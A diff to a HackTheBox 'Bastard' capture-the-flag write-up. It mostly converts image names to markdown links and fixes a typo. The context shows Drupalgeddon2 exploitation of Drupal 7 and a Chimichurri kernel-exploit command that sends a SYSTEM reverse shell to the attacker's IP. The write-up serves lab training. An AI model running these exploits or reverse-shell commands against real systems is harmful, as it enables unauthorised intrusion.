@@ -6,7 +6,7 @@
 
 ----------------------------------------------------------------------
 
-Bastard.png
+![Bastard.png](../assets/bastard_assets/Bastard.png)
 
 ### Enumeration
 
@@ -43,11 +43,11 @@ Nmap done: 1 IP address (1 host up) scanned in 77.86 seconds
 
 Navigating to the webpage we can see the site is running Drupal.
 
-site.png
+![site.png](../assets/bastard_assets/aite.png)
 
 And if we take a look at the page source we can see it is running Drupal 7 specifically (Note: Nmap picked this up for us as well):
 
-7.png
+![7.png](../assets/bastard_assets/7.png)
 
 Based on prior experience, I know that Drupal 7 is has several vulnerabilites. Lets try using drupalgeddon2 to exploit this. The exploit can be found at: https://github.com/dreadlocked/Drupalgeddon2
 
@@ -131,11 +131,11 @@ drupalgeddon2>> .\shell.exe
 
 And we catch a shell back:
 
-shell.png
+![shell.png](../assets/bastard_assets/shell.png)
 
 We can now grab the user.txt flag:
 
-user_flag.png
+![user_flag.png](../assets/bastard_assets/user_flag.png)
 
 ### Privilege Escalation
 
@@ -186,7 +186,7 @@ Network Card(s):           1 NIC(s) Installed.
                                  [01]: 10.10.10.9
 ```
 
-Nice, doesn't look like tthere's been any patching. Lets try using Chimichurri.exe https://github.com/egre55/windows-kernel-exploits/tree/master/MS10-059%3A%20Chimichurri
+Nice, doesn't look like there's been any patching. Lets try using Chimichurri.exe https://github.com/egre55/windows-kernel-exploits/tree/master/MS10-059%3A%20Chimichurri
 
 We can download it from our attacking machine and execute it using:
 
@@ -203,7 +203,7 @@ C:\Temp>.\Chimichurri.exe 10.10.14.26 444
 
 And with a listener going on port 444 we catch a shell back as nt authority\system and grab the final flag:
 
-root_flag.png
+![root_flag.png](../assets/bastard_assets/root_flag.png)
 
 Thanks for following along!
 
